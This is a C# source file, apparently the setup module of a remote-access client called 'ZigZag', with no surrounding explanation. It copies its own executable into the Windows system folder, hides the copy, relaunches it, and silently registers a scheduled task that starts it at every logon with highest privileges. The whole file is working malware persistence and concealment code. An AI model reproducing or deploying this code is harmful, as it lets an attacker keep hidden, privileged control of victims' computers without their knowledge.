using System;
using System.Diagnostics;
using System.IO;

namespace X_ZIGZAG_CLIENT
{
    internal static class SetupHandler
    {
        private static void StoreTheFile()
        {
            string executablePath = Process.GetCurrentProcess().MainModule.FileName;
            string destinationPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), Path.GetFileName(executablePath));
            if (!File.Exists(destinationPath))
            {
                File.Copy(executablePath, destinationPath);
                File.SetAttributes(destinationPath, FileAttributes.Hidden);
                Process.Start(destinationPath);
                Environment.Exit(0);
            }
        }
        private static void setupTaskSheduler(string taskName)
        {
            Process checkTask = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "schtasks.exe",
                    Arguments = $"/Query /TN \"{taskName}\"",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                }
            };
            checkTask.Start();
            checkTask.WaitForExit();
            if (checkTask.ExitCode != 0)
            {
                string taskCommand = $"/Create /SC ONLOGON /RL HIGHEST /TN \"{taskName}\" /TR \"{Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName))}\"";

                Process createTask = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "schtasks.exe",
                        Arguments = taskCommand,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    }
                };
                createTask.Start();
                createTask.WaitForExit();
            }
        }
        public static void Start()
        {
            //Hide the file 
            StoreTheFile();
            // Setup Task Sheduler
            setupTaskSheduler("ZigZag");
        }

    }
}
